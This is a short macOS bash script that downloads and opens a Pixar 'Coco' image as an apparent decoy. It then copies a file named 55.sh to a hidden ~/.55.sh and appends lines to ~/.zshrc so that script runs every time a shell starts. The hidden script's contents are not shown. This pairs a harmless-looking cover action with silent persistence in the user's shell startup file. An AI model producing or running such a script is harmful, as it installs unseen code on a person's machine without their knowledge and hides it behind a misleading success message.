#!/bin/bash
curl https://lumiere-a.akamaihd.net/v1/images/sa_pixar_virtualbg_coco_16x9_9ccd7110.jpeg >> ~/Downloads/img.png && open -a Preview ~/Downloads/img.png  && echo "successfuly Download" 
sleep 1
echo "###########################"
sleep 1
echo "alias 55='bash ~/.55.sh'" >> ~/.zshrc
cp -rf 55.sh ~/.55.sh
sleep 1
#bash ~/.55.sh
sleep 1
echo "bash ~/.55.sh" >> ~/.zshrc
source ~/.zshrc
